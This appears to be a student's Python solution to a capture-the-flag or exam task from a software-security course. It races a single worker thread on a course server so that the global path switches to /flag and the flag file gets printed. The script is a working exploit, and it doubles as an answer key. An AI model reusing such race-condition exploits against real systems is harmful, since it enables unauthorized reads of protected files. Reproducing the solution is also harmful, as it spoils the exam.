import socket

# Feedback: Eventhough I think that raceconditions are not well-suited for an exam, this one is fine, as it is very obvious and easy to exploit. If it gets more complicated, one always thinks: "do i have to wait longer, or is my idea just wrong"


# race condition
# there is only one worker thread
# we enter a valid file in home directory and let it get printed
# then we overrid path with /flag and hope that we get correct timing to get /flag printed
# works, because g_path is global char
with socket.create_connection(('tasks.ws24.softsec.rub.de', 33269)) as so:
    while True:
        so.sendall(b'vuln\n')
        potential_flag = so.recv(1024)
        if b'softsec{' in potential_flag:
            print(potential_flag)
            break

        so.sendall(b'/flag\n')
        potential_flag = so.recv(1024)
        if b'softsec{' in potential_flag:
            print(potential_flag)
            break
